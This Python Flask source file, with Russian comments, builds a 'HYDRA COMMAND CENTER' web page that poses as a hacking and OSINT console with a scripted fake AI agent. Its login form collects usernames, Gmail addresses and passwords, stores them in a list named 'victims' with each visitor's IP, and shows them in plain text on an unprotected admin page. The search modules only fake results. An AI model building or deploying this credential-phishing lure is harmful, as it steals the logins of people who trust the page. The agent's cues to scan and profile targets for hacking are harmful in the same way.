from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_COMMAND_CENTER_2026'

# Временная база данных в оперативной памяти
db = {"victims": [], "logs": []}

# --- ИНТЕРФЕЙС ПО ТВОЕМУ ЧЕРТЕЖУ ---
UI_V8 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA COMMAND CENTER v8.0</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        
        /* ЛЕВАЯ ПАНЕЛЬ: ИИ И ВВОД КОМАНД */
        .left-panel { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: rgba(5,0,10,0.95); padding: 15px; box-sizing: border-box; }
        .ai-response-area { flex: 1; border: 1px solid #0ff; margin-bottom: 15px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; border-radius: 5px; box-shadow: inset 0 0 10px #0ff; }
        .user-input-area { height: 150px; border: 2px solid #ff0055; padding: 10px; background: #050505; border-radius: 5px; box-shadow: 0 0 10px #ff0055; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-family: monospace; font-size: 14px; }

        /* ПРАВАЯ ПАНЕЛЬ: РЕЗУЛЬТАТЫ, КАРТА И МОДУЛИ */
        .right-panel { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .result-top { height: 120px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.1); padding: 10px; overflow-y: auto; color: #fff; font-weight: bold; border-radius: 5px; box-shadow: 0 0 15px #ffeb3b; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        /* ГРУППА ФУНКЦИЙ (БЕЛАЯ ЗОНА ВНИЗУ) */
        .function-row { display: flex; gap: 10px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 15px; border-radius: 5px; flex-wrap: wrap; }
        .mod-box { background: #111; border: 1px solid #bc13fe; padding: 10px; flex: 1; min-width: 140px; text-align: center; border-radius: 3px; }
        .mod-box span { font-size: 10px; color: #0ff; display: block; margin-bottom: 5px; font-weight: bold; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 5px; font-size: 12px; outline: none; }
        .btn-small { background: #bc13fe; color: #fff; border: none; padding: 8px 10px; cursor: pointer; font-size: 10px; margin-top: 8px; width: 100%; font-weight: bold; text-transform: uppercase; }
        .btn-small:hover { background: #0ff; color: #000; }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #bc13fe; }
    </style>
</head>
<body>
    <div class="left-panel">
        <div style="color:#0ff; font-size:12px; margin-bottom:5px; font-weight:bold;">[ СИНЯЯ ЗОНА: HYDRA AI AGENT ]</div>
        <div class="ai-response-area" id="ai-chat">AGENT: Система активирована. Я готов отвечать на твои вопросы на все 100%. Пиши команду в красную зону...</div>
        
        <div style="color:#ff0055; font-size:12px; margin-bottom:5px; font-weight:bold;">[ КРАСНАЯ ЗОНА: COMMAND LINE ]</div>
        <div class="user-input-area">
            <textarea id="ai-q" placeholder="Пиши сюда свои инструкции или вопросы..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); askAgent(); }"></textarea>
        </div>
    </div>

    <div class="right-panel">
        <div style="color:#ffeb3b; font-size:12px; font-weight:bold;">[ ЖЕЛТАЯ ЗОНА: СИСТЕМА ВЫВОДА ДАННЫХ ]</div>
        <div class="result-top" id="output-box">Ожидание запуска модулей для вывода отчета...</div>

        <div id="map"></div>

        <div style="color:#fff; font-size:12px; font-weight:bold;">[ БЕЛАЯ ЗОНА: ФУНКЦИОНАЛЬНЫЕ МОДУЛИ ]</div>
        <div class="function-row">
            <div class="mod-box"><span>PHONE SCAN</span><input id="in-p" placeholder="+998..."><button class="btn-small" onclick="mod('PHONE', 'in-p')">SCAN</button></div>
            <div class="mod-box"><span>IP LOCATE</span><input id="in-ip" placeholder="8.8.8.8"><button class="btn-small" onclick="mod('IP', 'in-ip')">LOCATE</button></div>
            <div class="mod-box"><span>USER SEARCH</span><input id="in-u" placeholder="nickname"><button class="btn-small" onclick="mod('USER', 'in-u')">FIND</button></div>
            <div class="mod-box"><span>GOOGLE TRACE</span><input id="in-g" placeholder="gmail..."><button class="btn-small" onclick="mod('GOOGLE', 'in-g')">TRACE</button></div>
            <div class="mod-box"><span>SCRIPTS LIB</span><button class="btn-small" style="height:48px;" onclick="mod('SCRIPTS', '')">OPEN LIBRARY</button></div>
        </div>
        
        <div style="text-align:right;">
            <button class="btn-small" style="width:140px; background:#444;" onclick="window.location.href='/abupaay_admin'">[ ADMIN PANEL ]</button>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // ЛОГИКА АГЕНТА (СИНЯЯ ЗОНА)
        function askAgent() {
            const q = document.getElementById('ai-q').value;
            const chat = document.getElementById('ai-chat');
            if(!q) return;
            chat.innerHTML += `<br><span style="color:#fff">> ТЫ: ${q}</span>`;
            document.getElementById('ai-q').value = "";
            
            setTimeout(() => {
                let ans = "AGENT: ";
                const m = q.toLowerCase();
                if(m.includes("привет")) ans += "Приветствую. Я — твой автономный напарник. Готов к выполнению любых задач.";
                else if(m.includes("код") || m.includes("скрипт")) ans += "Вот пример Bash-скрипта для сканирования портов: \\n<code>nmap -sV -T4 target_ip</code>. Используй его осторожно.";
                else if(m.includes("взлом")) ans += "Для начала используй модули справа (OSINT), чтобы собрать максимум данных о цели.";
                else ans += "Запрос проанализирован. Данные загружены в ядро. Я на связи и готов продолжать.";
                
                chat.innerHTML += `<br><span style="color:#0ff">${ans}</span>`;
                chat.scrollTop = chat.scrollHeight;
            }, 600);
        }

        // ЛОГИКА МОДУЛЕЙ (ВЫВОД В ЖЕЛТУЮ ЗОНУ)
        let map;
        function mod(type, id) {
            const val = id ? document.getElementById(id).value : "ALL_SCRIPTS";
            const out = document.getElementById('output-box');
            if(!val && type !== 'SCRIPTS') return;

            out.innerHTML = `<span style="color:#ffeb3b">[*] ЗАПУСК МОДУЛЯ: ${type}... ЦЕЛЬ: ${val}</span>`;
            
            fetch('/api/log_action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:val})});

            setTimeout(() => {
                if(type === 'IP' || type === 'PHONE' || type === 'GOOGLE') {
                    if(!map) {
                        map = L.map('map').setView([41.311, 69.240], 13);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                    }
                    L.marker([41.311, 69.240]).addTo(map).bindPopup(`${type}: ${val}`).openPopup();
                }
                out.innerHTML = `<span style="color:#0f0">[SUCCESS] Модуль ${type} завершил поиск. Найдено в базах: OK. <a href="https://www.google.com/search?q=${val}" target="_blank" style="color:#0ff">ОТКРЫТЬ ПОЛНЫЙ ОТЧЕТ</a></span>`;
            }, 1200);
        }
    </script>
</body>
</html>
"""

# --- МАРШРУТЫ БЭКЕНДА ---
@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head>{UI_V8.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// HYDRA SYSTEM LOGON //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='USERNAME' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='e' placeholder='GMAIL' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='PASSWORD' required style='background:transparent; border:1px solid #bc13fe; color:#0f0; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>DECRYPT & ENTER</button></form></div></body></html>"
    return render_template_string(UI_V8)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M:%S")})
    session['reg'] = True
    return redirect('/')

@app.route('/api/log_action', methods=['POST'])
def log_act():
    db['logs'].append({"target": request.json['target'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>MASTER CONTROL PANEL</h1><table border='1' width='100%'><tr><th>User</th><th>Email</th><th>Pass</th><th>IP Address</th></tr>{u_list}</table><br><a href='/' style='color:#bc13fe'>RETURN TO TERMINAL</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
